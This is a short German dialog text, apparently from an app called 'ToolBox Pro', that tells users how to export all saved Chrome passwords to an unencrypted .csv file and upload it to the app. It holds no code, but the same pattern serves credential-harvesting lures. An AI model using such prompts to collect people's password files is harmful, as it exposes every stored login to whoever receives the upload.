ToolBox Pro kann aus Sicherheitsgründen nicht direkt auf Ihre Browser-Passwörter zugreifen. Bitte exportieren Sie sie zuerst:

Anleitung für Chrome

  1. Öffnen Sie die Chrome-Einstellungen oder geben Sie chrome://settings/passwords in die Adressleiste ein.
  2. Klicken Sie auf das Drei-Punkte-Menü (⋮) neben "Gespeicherte Passwörter".
  3. Wählen Sie "Passwörter exportieren..." und speichern Sie die .csv-Datei.
  4. Schließen Sie dieses Fenster und klicken Sie unten auf "Datei auswählen", um die exportierte Datei hochzuladen.
